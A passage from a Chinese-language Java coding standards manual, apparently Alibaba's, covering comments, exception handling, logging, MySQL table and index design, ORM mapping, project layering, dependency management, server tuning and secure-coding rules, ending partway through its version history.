【推荐】与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持英文原文即可。\n     反例： “TCP 连接超时”解释成“传输控制协议连接超时”，理解反而费脑筋。\n\n 7.  【推荐】代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑等的修改。\n     说明： 代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后， 就失去了导航的意义。\n\n 8.  【参考】合理处理注释掉的代码。在上方详细说明，而不是简单的注释掉。如果无用，则删除。\n     说明： 代码被注释掉有两种可能性：1）后续会恢复此段代码逻辑。2）永久不用。前者如果没 有备注信息，难以知晓注释动机。后者建议直接删掉（代码仓库保存了历史代码）。\n\n 9.  【参考】对于注释的要求：第一、能够准确反应设计思想和代码逻辑；第二、能够描述业务含义，使别的程序员能够迅速了解到代码背后的信息。完全没有注释的大段代码对于阅读者形同天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。\n\n 10. 【参考】好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释是相当大的负担。\n     反例：\n\n// put elephant into fridge\nput(elephant, fridge);\n\n\n1\n2\n\n\n方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不需要额外的注释。\n\n 11. 【参考】特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描，经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。\n     1） 待办事宜（TODO）:（ 标记人，标记时间，[预计处理时间]）表示需要实现，但目前还未实现的功能。这实际上是一个 Javadoc 的标签，目前的 Javadoc 还没有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 Javadoc 标签）。\n     2） 错误，不能工作（FIXME）:（标记人，标记时间，[预计处理时间]）在注释中用 FIXME 标记某代码是错误的，而且不能工作，需要及时纠正的情况。\n\n\n# 其他\n\n 1. 【强制】在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。 说明：不要在方法体内定义：Pattern pattern = Pattern.compile(规则);\n\n 2. 【强制】velocity 调用 POJO 类的属性时，建议直接使用属性名取值即可，模板引擎会自动按规范调用 POJO 的 getXxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is前缀），会自动调用 isXxx()方法。\n    说明： 注意如果是 Boolean 包装类对象，优先调用 getXxx()的方法。\n\n 3. 【强制】后台输送给页面的变量必须加$!{var}——中间的感叹号。\n    说明： 如果 var=null 或者不存在，那么${var}会直接显示在页面上。\n\n 4. 【强制】注意 Math.random() 这个方法返回是 double 类型，注意取值的范围 0≤x<1（能够取到零值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后取整，直接使用 Random 对象的 nextInt 或者 nextLong 方法。\n\n 5. 【强制】获取当前毫秒数 System.currentTimeMillis(); 而不是 new Date().getTime();\n    说明： 如果想获取更加精确的纳秒级时间值，使用 System.nanoTime()的方式。在 JDK8 中，针对统计时间等场景，推荐使用 Instant 类。\n\n 6. 【推荐】不要在视图模板中加入任何复杂的逻辑。 说明： 根据 MVC 理论，视图的职责是展示，不要抢模型和控制器的活。\n\n 7. 【推荐】任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。\n\n 8. 【推荐】对于“明确停止使用的代码和配置”，如方法、变量、类、配置文件、动态配置属性等要坚决从程序中清理出去，避免造成过多垃圾。\n\n\n# 异常日志\n\n\n# 异常处理\n\n 1.  【强制】Java 类库中定义的一类 RuntimeException 可以通过预先检查进行规避，而不应该通过 catch 来处理，比如： IndexOutOfBoundsException ， NullPointerException 等等。\n     说明： 无法通过预检查的异常除外，如在解析一个外部传来的字符串形式数字时，通过 catch NumberFormatException 来实现。\n     正例： if (obj != null) {...}\n     反例： try { obj.method() } catch (NullPointerException e) {...}\n\n 2.  【强制】异常不要用来做流程控制，条件控制，因为异常的处理效率比条件分支低。\n\n 3.  【强制】对大段代码进行 try-catch，这是不负责任的表现。catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。\n\n 4.  【强制】捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容。\n\n 5.  【强制】有 try 块放到了事务代码中，catch 异常后，如果需要回滚事务，一定要注意手动回滚事务。\n\n 6.  【强制】finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。\n     说明： 如果 JDK7 及以上，可以使用 try-with-resources 方式。\n\n 7.  【强制】不能在 finally 块中使用 return，finally 块中的 return 返回后方法结束执行，不会再执行 try 块中的 return 语句。\n\n 8.  【强制】捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。\n     说明： 如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。\n\n 9.  【推荐】方法的返回值可以为 null，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下会返回 null 值。调用方需要进行 null 判断防止 NPE 问题。\n     说明： 本手册明确防止 NPE 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。\n\n 10. 【推荐】防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：\n     1）返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。\n     反例： public int f() { return Integer 对象}， 如果为 null，自动解箱抛 NPE。\n     2） 数据库的查询结果可能为 null。\n     3） 集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。\n     4） 远程调用返回对象时，一律要求进行空指针判断，防止 NPE。\n     5） 对于 Session 中获取的数据，建议 NPE 检查，避免空指针。\n     6） 级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。\n     正例： 使用 JDK8 的 Optional 类来防止 NPE 问题。\n\n 11. 【推荐】定义时区分 unchecked / checked 异常，避免直接抛出 new RuntimeException()，更不允许抛出 Exception 或者 Throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：DAOException / ServiceException 等。\n\n 12. 【参考】在代码中使用“抛异常”还是“返回错误码”，对于公司外的 http/api 开放接口必须使用“错误码”；而应用内部推荐异常抛出；跨应用间 RPC 调用优先考虑使用 Result 方式，封装 isSuccess()方法、“错误码”、“错误简短信息”。\n     说明： 关于 RPC 方法返回方式使用 Result 方式的理由：\n     1）使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。\n     2）如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。\n\n 13. 【参考】避免出现重复的代码（Don’t Repeat Yourself），即 DRY 原则。\n     说明： 随意复制和粘贴代码，必然会导致代码的重复，在以后需要修改时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是共用模块。\n     正例： 一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取： private boolean checkParam(DTO dto) {...}\n\n\n# 日志规约\n\n 1. 【强制】应用中不可直接使用日志系统（Log4j、Logback）中的 API，而应依赖使用日志框架 SLF4J 中的 API，使用门面模式的日志框架，有利于维护和各个类的日志处理方式统一。\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nprivate static final Logger logger = LoggerFactory.getLogger(Abc.class);\n\n\n1\n2\n3\n\n\n 2. 【强制】日志文件推荐至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。\n\n 3. 【强制】应用中的扩展日志（如打点、临时监控、访问日志等）命名方式：appName_logType_logName.log。logType:日志类型，推荐分类有 stats/desc/monitor/visit 等；logName:日志描述。这种命名的好处：通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。\n    正例： mppserver 应用中单独监控时区转换异常，如： mppserver_monitor_timeZoneConvert.log\n    说明： 推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于 通过日志对系统进行及时监控。\n\n 4. 【强制】对 trace/debug/info 级别的日志输出，必须使用条件输出形式或者使用占位符的方 式。\n    说明： logger.debug("Processing trade with id: " + id + " symbol: " + symbol);如果日志级别是 warn，上述日志不会打印，但是会执行字符串拼接操作，如果 symbol 是对象，会执行 toString() 方法，浪费了系统资源，执行了上述操作，最终日志却没有打印。\n    正例： （条件）\n\nif (logger.isDebugEnabled()) {\n    logger.debug("Processing trade with id: " + id + " symbol: " + symbol);\n}\n\n\n1\n2\n3\n\n\n正例： （占位符）\n\nlogger.debug("Processing trade with id: {} symbol : {} ", id, symbol);\n\n\n1\n\n\n 5. 【强制】避免重复打印日志，浪费磁盘空间，务必在 log4j.xml 中设置 additivity=false。\n    正例： <logger name="com.taobao.dubbo.config" additivity="false">\n\n 6. 【强制】异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。\n    正例： logger.error(各类参数或者对象 toString + "_" + e.getMessage(), e);\n\n 7. 【推荐】谨慎地记录日志。生产环境禁止输出 debug 日志；有选择地输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘 撑爆，并记得及时删除这些观察日志。\n    说明： 大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？\n\n 8. 【参考】可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。注意日志输出的级别，error 级别只记录系统逻辑出错、异常等重要的错误信息。如非必要，请不要在此场景打出 error 级别。\n\n\n# MYSQL 数据库\n\n\n# 建表规约\n\n 1.  【强制】表达是与否概念的字段，必须使用 is_xxx 的方式命名，数据类型是 unsigned tinyint（ 1 表示是，0 表示否）。\n     说明： 任何字段如果为非负数，必须是 unsigned。\n     正例： 表达逻辑删除的字段名 is_deleted，1 表示删除，0 表示未删除。\n\n 2.  【强制】表名、字段名必须使用小写字母或数字，禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。\n     正例： getter_admin，task_config，level3_name\n     反例： GetterAdmin，taskConfig，level_3_name\n\n 3.  【强制】表名不使用复数名词。\n     说明： 表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 DO 类名也是单数形式，符合表达习惯。\n\n 4.  【强制】禁用保留字，如 desc、range、match、delayed 等，请参考 MySQL 官方保留字。\n\n 5.  【强制】主键索引名为 pk_字段名；唯一索引名为 uk_字段名；普通索引名则为 idx_字段名。\n     说明： pk_ 即 primary key；uk_ 即 unique key；idx_ 即 index 的简称。\n\n 6.  【强制】小数类型为 decimal，禁止使用 float 和 double。\n     说明： float 和 double 在存储的时候，存在精度损失的问题，很可能在值的比较时，得到不正确的结果。如果存储的数据范围超过 decimal 的范围，建议将数据拆成整数和小数分开存储。\n\n 7.  【强制】如果存储的字符串长度几乎相等，使用 char 定长字符串类型。\n\n 8.  【强制】varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度大于此值，定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效率。\n\n 9.  【强制】表必备三字段：id, gmt_create, gmt_modified。 说明： 其中 id 必为主键，类型为 unsigned bigint、单表时自增、步长为 1。gmt_create, gmt_modified 的类型均为 date_time 类型。\n\n 10. 【推荐】表的命名最好是加上“业务名称_表的作用”。\n     正例： tiger_task / tiger_reader / mpp_config\n\n 11. 【推荐】库名与应用名称尽量一致。\n\n 12. 【推荐】如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。\n\n 13. 【推荐】字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循：\n     1）不是频繁修改的字段。\n     2）不是 varchar 超长字段，更不能是 text 字段。\n     正例： 商品类目名称使用频率高，字段长度短，名称基本一成不变，可在相关联的表中冗余存 储类目名称，避免关联查询。\n\n 14. 【推荐】单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。\n     说明： 如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。\n\n 15. 【参考】合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索速度。\n     正例： 如下表，其中无符号值可以避免误存负数，且扩大了表示范围。\n\n对象     年龄区间      类型                  表示范围\n人      150 岁之内   unsigned tinyint    无符号值：0 到 255\n龟      数百岁       unsigned smallint   无符号值：0 到 65535\n恐龙化石   数千万年      unsigned int        无符号值：0 到约 42.9 亿\n太阳     约 50 亿年   unsigned bigint     无符号值：0 到约 10 的 19 次方\n\n\n# 索引规约\n\n 1.  【强制】业务上具有唯一特性的字段，即使是多个字段的组合，也必须建成唯一索引。 说明：不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的；另外，即使在应用层做了非常完善的校验控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。\n\n 2.  【强制】 超过三个表禁止 join。需要 join 的字段，数据类型必须绝对一致；多表关联查询时，保证被关联的字段需要有索引。\n     说明： 即使双表 join 也要注意表索引、SQL 性能。\n\n 3.  【强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据实际文本区分度决定索引长度即可。\n     说明： 索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90%以上，可以使用 count(distinct left(列名, 索引长度))/count(*)的区分度来确定。\n\n 4.  【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。\n     说明： 索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。\n\n 5.  【推荐】如果有 order by 的场景，请注意利用索引的有序性。order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现 file_sort 的情况，影响查询性能。\n     正例： where a=? and b=? order by c; 索引：a_b_c\n     反例： 索引中有范围查找，那么索引有序性无法利用，如：WHERE a>10 ORDER BY b; 索引 a_b 无法排序。\n\n 6.  【推荐】利用覆盖索引来进行查询操作，避免回表。\n     说明： 如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这个目录就是起到覆盖索引的作用。\n     正例： 能够建立索引的种类：主键索引、唯一索引、普通索引，而覆盖索引是一种查询的一种 效果，用 explain 的结果，extra 列会出现：using index。\n\n 7.  【推荐】利用延迟关联或者子查询优化超多分页场景。\n     说明： MySQL 并不是跳过 offset 行，而是取 offset+N 行，然后返回放弃前 offset 行，返回 N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。\n     正例： 先快速定位需要获取的 id 段，然后再关联： SELECT a.* FROM 表 1 a, (select id from 表 1 where 条件 LIMIT 100000,20 ) b where a.id=b.id\n\n 8.  【推荐】SQL 性能优化的目标：至少要达到 range 级别，要求是 ref 级别，如果可以是 consts 最好。\n     说明：\n     1） consts 单表中最多只有一个匹配行（主键或者唯一索引），在优化阶段即可读取到数据。\n     2） ref 指的是使用普通的索引（normal index）。\n     3） range 对索引进行范围检索。\n     反例： explain 表的结果，type=index，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。\n\n 9.  【推荐】建组合索引的时候，区分度最高的在最左边。\n     正例： 如果 where a=? and b=? ，a 列的几乎接近于唯一值，那么只需要单建 idx_a 索引即可。\n     说明： 存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如：where a>? and b=? 那么即使 a 的区分度更高，也必须把 b 放在索引的最前列。\n\n 10. 【推荐】防止因字段类型不同造成的隐式转换，导致索引失效。\n\n 11. 【参考】创建索引时避免有如下极端误解：\n     1）宁滥勿缺。误认为一个查询就需要建一个索引。\n     2）宁缺勿滥。误认为索引会消耗空间、严重拖慢更新和新增速度。\n     3）抵制惟一索引。误认为业务的惟一性一律需要在应用层通过“先查后插”方式解决。\n\n\n# SQL 语句\n\n 1.  【强制】不要使用 count(列名)或 count(常量)来替代 count()，count()是 SQL92 定义的标准统计行数的语法，跟数据库无关，跟 NULL 和非 NULL 无关。\n     说明： count(*)会统计值为 NULL 的行，而 count(列名)不会统计此列为 NULL 值的行。\n\n 2.  【强制】count(distinct col) 计算该列除 NULL 之外的不重复行数，注意 count(distinct col1, col2) 如果其中一列全为 NULL，那么即使另一列有不同的值，也返回为 0。\n\n 3.  【强制】当某一列的值全是 NULL 时，count(col)的返回结果为 0，但 sum(col)的返回结果为 NULL，因此使用 sum()时需注意 NPE 问题。\n     正例： 可以使用如下方式来避免 sum 的 NPE 问题：SELECT IF(ISNULL(SUM(g)),0,SUM(g)) FROM table;\n\n 4.  【强制】使用 ISNULL()来判断是否为 NULL 值。注意：NULL 与任何值的直接比较都为 NULL。\n     说明：\n     1） NULL<>NULL 的返回结果是 NULL，而不是 false。\n     2） NULL=NULL 的返回结果是 NULL，而不是 true。\n     3） NULL<>1 的返回结果是 NULL，而不是 true。\n\n 5.  【强制】在代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。\n\n 6.  【强制】不得使用外键与级联，一切外键概念必须在应用层解决。\n     说明： （概念解释）学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，则为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度。\n\n 7.  【强制】禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。\n\n 8.  【强制】数据订正时，删除和修改记录时，要先 select，避免出现误删除，确认无误才能执行更新语句。\n\n 9.  【推荐】in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。\n\n 10. 【参考】如果有全球化需要，所有的字符存储与表示，均以 utf-8 编码，注意字符统计函数的区别。\n     说明： SELECT LENGTH("轻松工作")； 返回为 12\n     SELECT CHARACTER_LENGTH("轻松工作")； 返回为 4\n     如果要使用表情，那么使用 utfmb4 来进行存储，注意它与 utf-8 编码的区别。\n\n 11. 【参考】TRUNCATE TABLE 比 DELETE 速度快，且使用的系统和事务日志资源少，但 TRUNCATE 无事务且不触发 trigger，有可能造成事故，故不建议在开发代码中使用此语句。\n     说明： TRUNCATE TABLE 在功能上与不带 WHERE 子句的 DELETE 语句相同。\n\n\n# ORM 映射\n\n 1. 【强制】在表查询中，一律不要使用 * 作为查询的字段列表，需要哪些字段必须明确写明。\n    说明： 1）增加查询分析器解析成本。2）增减字段容易与 resultMap 配置不一致。\n\n 2. 【强制】POJO 类的布尔属性不能加 is，而数据库字段必须加 is_，要求在 resultMap 中进行字段与属性之间的映射。\n    说明： 参见定义 POJO 类以及数据库字段定义规定，在<resultMap>中增加映射，是必须的。在 MyBatis Generator 生成的代码中，需要进行对应的修改。\n\n 3. 【强制】不要用 resultClass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要定义；反过来，每一个表也必然有一个与之对应。\n    说明： 配置映射关系，使字段与 DO 类解耦，方便维护。\n\n 4. 【强制】sql.xml 配置参数使用：#{}，#param# 不要使用${} 此种方式容易出现 SQL 注入。\n\n 5. 【强制】iBATIS 自带的 queryForList(String statementName,int start,int size)不推荐使用。\n    说明： 其实现方式是在数据库取到statementName对应的SQL语句的所有记录，再通过subList 取 start,size 的子集合。\n    正例：\n\n Map<String, Object> map = new HashMap<String, Object>();\n map.put("start", start);\n map.put("size", size);\n\n\n1\n2\n3\n\n\n 6.  【强制】不允许直接拿 HashMap 与 Hashtable 作为查询结果集的输出。\n     说明： resultClass=”Hashtable”，会置入字段名和属性值，但是值的类型不可控。\n\n 7.  【强制】更新数据表记录时，必须同时更新记录对应的 gmt_modified 字段值为当前时间。\n\n 8.  【推荐】不要写一个大而全的数据更新接口，传入为 POJO 类，不管是不是自己的目标更新字段，都进行 update table set c1=value1,c2=value2,c3=value3; 这是不对的。执行 SQL 时，不要更新无改动的字段，一是易出错；二是效率低；三是增加 binlog 存储。\n\n 9.  【参考】@Transactional 事务不要滥用。事务会影响数据库的 QPS，另外使用事务的地方需要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。\n\n 10. 【参考】<isEqual>中的 compareValue 是与属性值对比的常量，一般是数字，表示相等时带上此条件；<isNotEmpty>表示不为空且不为 null 时执行；<isNotNull>表示不为 null 值时执行。\n\n\n# 工程结构\n\n\n# 应用分层\n\n 1. 【推荐】图中默认上层依赖于下层，箭头关系表示可直接依赖，如：开放接口层可以依赖于 Web 层，也可以直接依赖于 Service 层，依此类推：\n    \n    \n    \n    * 开放接口层： 可直接封装 Service 方法暴露成 RPC 接口；通过 Web 封装成 http 接口；进行网关安全控制、流量控制等。\n    * 终端显示层： 各个端的模板渲染并执行显示的层。当前主要是 velocity 渲染，JS 渲染，JSP 渲染，移动端展示等。\n    * Web 层： 主要是对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理等。\n    * Service 层： 相对具体的业务逻辑服务层。\n    * Manager 层： 通用业务处理层，它有如下特征：\n      1. 对第三方平台封装的层，预处理返回结果及转化异常信息；\n      2. 对 Service 层通用能力的下沉，如缓存方案、中间件通用处理；\n      3. 与 DAO 层交互，对多个 DAO 的组合复用。\n    * DAO 层： 数据访问层，与底层 MySQL、Oracle、Hbase 进行数据交互。\n    * 外部接口或第三方平台： 包括其它部门 RPC 开放接口，基础平台，其它公司的 HTTP 接口。\n\n 2. 【参考】 （分层异常处理规约）在 DAO 层，产生的异常类型有很多，无法用细粒度的异常进行 catch，使用 catch(Exception e)方式，并 throw new DAOException(e)，不需要打印 日志，因为日志在 Manager/Service 层一定需要捕获并打到日志文件中去，如果同台服务器再打日志，浪费性能和存储。在 Service 层出现异常时，必须记录出错日志到磁盘，尽可能带上参数信息，相当于保护案发现场。如果 Manager 层与 Service 同机部署，日志方式与 DAO 层处理一致，如果是单独部署，则采用与 Service 一致的处理方式。Web 层绝不应该继续往上抛异常，因为已经处于顶层，无继续处理异常的方式，如果意识到这个异常将导致页面无法正常渲染，那么就应该直接跳转到友好错误页面，加上友好的错误提示信息。开放接口层要将异常处理成错误码和错误信息方式返回。\n\n 3. 【参考】分层领域模型规约：\n    \n    * DO（Data Object）： 与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。\n    * DTO（Data Transfer Object）： 数据传输对象，Service 和 Manager 向外传输的对象。\n    * BO（Business Object）： 业务对象。可以由 Service 层输出的封装业务逻辑的对象。\n    * Query： 数据查询对象，各层接收上层的查询请求。注：超过 2 个参数的查询封装，禁止使用 Map 类来传输。\n    * VO（View Object）： 显示层对象，通常是 Web 向模板渲染引擎层传输的对象。\n\n\n# 二方库依赖\n\n 1.  【强制】定义 GAV 遵从以下规则：\n     1） GroupID 格式：com.{公司/BU }.业务线.[子业务线]，最多 4 级。\n     说明： {公司/BU} 例如：alibaba/taobao/tmall/aliexpress 等 BU 一级；子业务线可选。\n     正例： com.taobao.jstorm 或 com.alibaba.dubbo.register\n     2） ArtifactID 格式：产品线名-模块名。语义不重复不遗漏，先到中央仓库去查证一下。\n     正例： dubbo-client / fastjson-api / jstorm-tool\n     3） Version：详细规定参考下方。\n\n 2.  【强制】二方库版本号命名方式：主版本号.次版本号.修订号\n     1） 主版本号：当做了不兼容的 API 修改，或者增加了能改变产品方向的新功能。\n     2） 次版本号：当做了向下兼容的功能性新增（新增类、接口等）。\n     3） 修订号：修复 bug，没有修改方法签名的功能加强，保持 API 兼容性。\n     说明： 注意：起始版本号必须为：1.0.0，而不是 0.0.1 正式发布的类库必须先去中央仓库进行查证，使版本号有延续性，正式版本号不允许覆盖升级。如当前版本：1.3.3，那么下一个合理的版本号：1.3.4 或 1.4.0 或 2.0.0\n\n 3.  【强制】线上应用不要依赖 SNAPSHOT 版本（安全包除外）。\n     说明： 不依赖 SNAPSHOT 版本是保证应用发布的幂等性。另外，也可以加快编译时的打包构建。\n\n 4.  【强制】二方库的新增或升级，保持除功能点之外的其它 jar 包仲裁结果不变。如果有改变， 必须明确评估和验证，建议进行 dependency:resolve 前后信息比对，如果仲裁结果完全不一 致，那么通过 dependency:tree 命令，找出差异点，进行<excludes>排除 jar 包。\n\n 5.  【强制】二方库里可以定义枚举类型，参数可以使用枚举类型，但是接口返回值不允许使用枚 举类型或者包含枚举类型的 POJO 对象。\n\n 6.  【强制】依赖于一个二方库群时，必须定义一个统一的版本变量，避免版本号不一致。 说明：依赖 springframework-core,-context,-beans，它们都是同一个版本，可以定义一 个变量来保存版本：${spring.version}，定义依赖的时候，引用该版本。\n\n 7.  【强制】禁止在子项目的 pom 依赖中出现相同的 GroupId，相同的 ArtifactId，但是不同的 Version。\n     说明： 在本地调试时会使用各子项目指定的版本号，但是合并成一个 war，只能有一个版本号 出现在最后的 lib 目录中。可能出现线下调试是正确的，发布到线上却出故障的问题。\n\n 8.  【推荐】所有 pom 文件中的依赖声明放在<dependencies>语句块中，所有版本仲裁放在 <dependencyManagement>语句块中。 说明：<dependencyManagement>里只是声明版本，并不实现引入，因此子项目需要显式的声 明依赖，version 和 scope 都读取自父 pom。而<dependencies>所有声明在主 pom 的 <dependencies>里的依赖都会自动引入，并默认被所有的子项目继承。\n\n 9.  【推荐】二方库不要有配置项，最低限度不要再增加配置项。\n\n 10. 【参考】为避免应用二方库的依赖冲突问题，二方库发布者应当遵循以下原则：\n     1）精简可控原则。移除一切不必要的 API 和依赖，只包含 Service API、必要的领域模型对 象、Utils 类、常量、枚举等。如果依赖其它二方库，尽量是 provided 引入，让二方库使用 者去依赖具体版本号；无 log 具体实现，只依赖日志框架。\n     2）稳定可追溯原则。每个版本的变化应该被记录，二方库由谁维护，源码在哪里，都需要能 方便查到。除非用户主动升级版本，否则公共二方库的行为不应该发生变化。\n\n\n# 服务器\n\n 1. 【推荐】高并发服务器建议调小 TCP 协议的 time_wait 超时时间。 说明：操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接，在高并发访问下，服 务器端会因为处于 time_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上 调小此等待值。\n    正例： 在 linux 服务器上请通过变更/etc/sysctl.conf 文件去修改该缺省值（秒）： net.ipv4.tcp_fin_timeout = 30\n\n 2. 【推荐】调大服务器所支持的最大文件句柄数（File Descriptor，简写为 fd）。\n    说明： 主流操作系统的设计是将 TCP/UDP 连接采用与文件一样的方式去管理，即一个连接对 应于一个 fd。主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易因为 fd 不足而出现“open too many files”错误，导致新的连接无法建立。 建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）。\n\n 3. 【推荐】给 JVM 设置-XX:+HeapDumpOnOutOfMemoryError 参数，让 JVM 碰到 OOM 场景时输出 dump 信息。\n    说明： OOM 的发生是有概率的，甚至有规律地相隔数月才出现一例，出现时的现场信息对查错 非常有价值。\n\n 4. 【参考】服务器内部重定向使用 forward；外部重定向地址使用 URL 拼装工具类来生成，否则 会带来 URL 维护不一致的问题和潜在的安全风险。\n\n\n# 安全规约\n\n 1. 【强制】隶属于用户个人的页面或者功能必须进行权限控制校验。\n    说明： 防止没有做水平权限校验就可随意访问、修改、删除别人的数据，比如查看他人的私信 内容、修改他人的订单。\n\n 2. 【强制】用户敏感数据禁止直接展示，必须对展示数据进行脱敏。\n    说明： 查看个人手机号码会显示成:158****9119，隐藏中间 4 位，防止隐私泄露。\n\n 3. 【强制】用户输入的 SQL 参数严格使用参数绑定或者 METADATA 字段值限定，防止 SQL 注入， 禁止字符串拼接 SQL 访问数据库。\n\n 4. 【强制】用户请求传入的任何参数必须做有效性验证。\n    说明： 忽略参数校验可能导致：\n    \n    * page size 过大导致内存溢出\n    * 恶意 order by 导致数据库慢查询\n    * 任意重定向\n    * SQL 注入\n    * 反序列化注入\n    * 正则输入源串拒绝服务 ReDoS\n    \n    说明： Java 代码用正则来验证客户端的输入，有些正则写法验证普通用户输入没有问题， 但是如果攻击人员使用的是特殊构造的字符串来验证，有可能导致死循环的结果。\n\n 5. 【强制】禁止向 HTML 页面输出未经安全过滤或未正确转义的用户数据。\n\n 6. 【强制】表单、AJAX 提交必须执行 CSRF 安全过滤。\n    说明： CSRF(Cross-site request forgery)跨站请求伪造是一类常见编程漏洞。对于存在 CSRF 漏洞的应用/网站，攻击者可以事先构造好 URL，只要受害者用户一访问，后台便在用户 不知情情况下对数据库中用户参数进行相应修改。\n\n 7. 【强制】在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放限制， 如数量限制、疲劳度控制、验证码校验，避免被滥刷、资损。 说明：如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能骚扰到其 它用户，并造成短信平台资源浪费。\n\n 8. 【推荐】发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过 滤等风控策略。\n\n\n# 附 1：版本历史\n\n版本号     更新日期        备注\n1.0.0   2017.2.9    阿里巴巴集团正式对外发布\n1.0.1   2017.2.13   1）修正 String[]的前后矛盾。2）vm 修正成 velocity。3）修正 countdown 描述错误。\n1.0.2   2017.2.20   1）去除文底水印。2）数据类型中引用太阳系年龄问题。3）修正关于异常和方法签名的部分描述。4）修正 final\n                    描述。5）去除 Comparator 部分描述。\n1.1.0   2017.2.27   1）增加前言。2）增加<? extends T>描述和说明。3）增加版本历史。4）增加专有名词解释。\n1.1.1   2017.3.31   修正页码总数和部分示例\n1.2.0   2017.5.20   1）根据云栖社区的“聚能聊”活动反馈，对手册的页码、排版、描述进行修正。2）增加\n                    final的适用场景描述。3）增加关于锁的粒度的说明。4）增加“指定集合大小”的详细说明以及正反例。5）增加卫语句的示例代码。6）明确数据库表示删除概念的字段名为\n                    